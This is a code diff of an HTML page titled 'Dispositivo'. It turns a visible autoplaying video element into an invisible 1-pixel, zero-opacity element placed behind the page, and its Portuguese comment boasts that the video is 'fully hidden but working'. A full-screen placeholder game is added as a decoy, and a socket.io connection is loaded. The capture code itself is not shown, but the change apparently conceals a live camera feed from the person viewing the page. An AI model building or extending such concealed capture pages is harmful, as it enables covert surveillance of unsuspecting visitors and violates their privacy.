@@ -5,15 +5,41 @@
     <title>Dispositivo</title>
     <style>
         #video {
-            width: 320px;
-            height: 240px;
-            border: 1px solid #ccc;
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            z-index: -1000;
+            overflow: hidden;
+        }
+        
+        #game-container {
+            width: 100%;
+            height: 100vh;
+            background-color: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        #game-placeholder {
+            font-size: 24px;
+            color: #333;
         }
     </style>
 </head>
 <body>
     <h2 style="display:none;">Dispositivo</h2>
+    
+    <!-- Vídeo totalmente escondido mas funcionando -->
     <video id="video" autoplay muted></video>
+    
+    <!-- Container do jogo -->
+    <div id="game-container">
+        <p id="game-placeholder">Jogo será carregado aqui</p>
+        <!-- Você pode substituir por um canvas ou iframe do jogo depois -->
+    </div>
+
     <p id="status"></p>
 
     <script src="/socket.io/socket.io.js"></script>
